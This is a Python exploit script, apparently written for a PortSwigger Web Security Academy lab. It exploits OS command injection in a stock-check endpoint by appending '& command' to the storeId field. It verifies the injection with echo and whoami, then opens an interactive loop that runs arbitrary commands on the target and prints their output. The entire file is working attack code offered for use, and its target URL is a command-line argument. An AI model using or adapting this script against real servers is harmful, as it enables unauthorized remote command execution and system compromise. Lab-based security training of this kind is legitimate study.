import requests
import urllib3,sys,argparse
from pyfiglet import figlet_format,FigletFont
from colorama import init
from random import randrange
from termcolor import colored

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Initialize colorama for Windows support
init(autoreset=True)

# taking the url from the user
def parse_args():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest = "url",
                        help = "your target ex : https://0a3000ad04bcc1d581618e43005400ad.web-security-academy.net/",
                        default = "https://0a250068031450d5835cdc2a002b0069.web-security-academy.net",
                        required = True)
    return parser.parse_args()

# banner
def banner():
    list=FigletFont.getFonts()
    print(figlet_format("OS", font=list[randrange(len(list) - 1)]))
    print(colored("Build a Simple OS Command injection  Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))


def os_injection_command(url,command):

    URL=url+'/product/stock'
    parame={'productId':'2','storeId':'1'+' & '+command}

    try:
        r=requests.post(url=URL,data=parame,verify=False,proxies=proxies,timeout=5)
         # remove the units in the stock
        if r!=None:
            respons=r.text.split('32')[0]
            return(respons.strip())
    except Exception as e:
        print(colored(e,'yellow'))
        return None
  
def main():
    banner()
    url=parse_args().url
    # Skip / in the URL 
    URL=str(url).rstrip('/')
   
   # Injection check
    command='echo Os-Injection' 
    results=os_injection_command(URL,command)
    if results == 'Os-Injection': 
        print(colored(f'injection successful','green'))
    else:
        print(colored('injection unsuccessful','red'))
        sys.exit(0)

    # get the shell's name
    command='whoami' 
    shell=os_injection_command(URL,command)
    print('Shell is opened now to exit enter exit enjoy :)')

    # open the shell in your terminal
    while True:
        command=str(input(shell+'>:'))
        if command =='exit' or command =='exit()' :
            sys.exit(0)
        result=os_injection_command(URL,command) 
        print(shell+'>>:'+result)

if __name__=='__main__':
    main()